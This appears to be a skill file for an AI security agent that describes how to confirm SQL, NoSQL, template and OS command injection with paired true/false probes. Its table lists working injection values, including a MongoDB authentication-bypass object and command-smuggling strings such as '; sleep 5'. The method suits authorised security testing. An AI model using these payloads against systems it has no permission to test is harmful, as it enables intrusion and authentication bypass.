---
name: viper-injection-oracle
description: Precision Injection Hunting Skill (SQLi, NoSQLi, SSTI, Command Injection). Focuses on manual DBMS/template fingerprinting, boolean/time differential pairs, and OOB proof.
---

# ViperClaw Injection Oracle (`viper-injection-oracle`)

## Zero-Noise Injection Philosophy
Never spray 10,000 sqlmap payloads at an endpoint before confirming a **deterministic differential pair** (True Condition vs. False Condition).

## Differential Probe Matrix

| Class | Baseline True Probe (Should match normal response) | Baseline False / Break Probe (Should alter status/length/time) | Confirmation Proof |
| :--- | :--- | :--- | :--- |
| **SQL Injection (String)** | `param' AND '1'='1` | `param' AND '1'='2` | Extract `version()` / `current_user` or deterministic 5s sleep delta. |
| **SQL Injection (Numeric / ORDER BY)** | `sort=1 ASC` or `(SELECT 1)` | `sort=(SELECT 1/0)` | Error-based DBMS banner or deterministic row-order swap. |
| **NoSQL Injection (MongoDB)** | `{"user": "admin", "pass": {"$ne": "invalid"}}` | `{"user": "admin", "pass": {"$eq": "invalid"}}` | Auth bypass or boolean `$regex` character extraction. |
| **SSTI (Jinja2 / Twig / Freemarker)** | `{{7*7}}` / `${7*7}` | `{{7*'7'}}` | Mathematical evaluation (`49` vs `7777777`) inside rendered output. |
| **OS Command Injection** | `; true` / `| echo viper_ok` | `; sleep 5` / OOB DNS ping | Deterministic timing delta (`viper_diff_oracle`) or OOB interaction receipt. |
